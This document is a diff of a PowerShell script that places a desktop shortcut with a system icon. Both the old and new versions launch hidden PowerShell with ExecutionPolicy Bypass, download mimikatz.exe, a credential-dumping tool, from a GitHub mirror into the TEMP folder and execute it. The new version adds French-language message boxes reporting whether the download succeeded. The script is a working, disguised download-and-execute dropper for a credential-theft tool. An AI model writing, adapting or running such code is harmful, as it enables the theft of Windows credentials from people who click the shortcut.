@@ -1,7 +1,7 @@
 $Desktop = [Environment]::GetFolderPath("Desktop")
 $WshShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("$Desktop\mimi.lnk")
+$Shortcut = $WshShell.CreateShortcut("$Desktop\mimi_popup.lnk")
 $Shortcut.TargetPath = "powershell.exe"
-$Shortcut.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest https://raw.githubusercontent.com/ParrotSec/mimikatz/6375ee772e3c69a788eb6fe24e457390e06702bf/x64/mimikatz.exe -OutFile $env:TEMP\mimi.exe; Start-Process $env:TEMP\mimi.exe"'
+$Shortcut.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; $dest = \"$env:TEMP\mimi.exe\"; try { Invoke-WebRequest ''https://raw.githubusercontent.com/ParrotSec/mimikatz/6375ee772e3c69a788eb6fe24e457390e06702bf/x64/mimikatz.exe'' -OutFile $dest -ErrorAction Stop; if (Test-Path $dest) { [System.Windows.Forms.MessageBox]::Show(\"Téléchargement réussi.`nFichier enregistré ici : $dest\", \"Succès\", 0, ''Information''); Start-Process $dest } else { [System.Windows.Forms.MessageBox]::Show(\"Script exécuté, mais fichier non trouvé à l''emplacement attendu.\", \"Erreur\", 0, ''Error'') } } catch { [System.Windows.Forms.MessageBox]::Show(\"Erreur lors de l''exécution ou du téléchargement.`n$_\", \"Erreur\", 0, ''Error'') }"'
 $Shortcut.IconLocation = "shell32.dll,13"
 $Shortcut.Save()
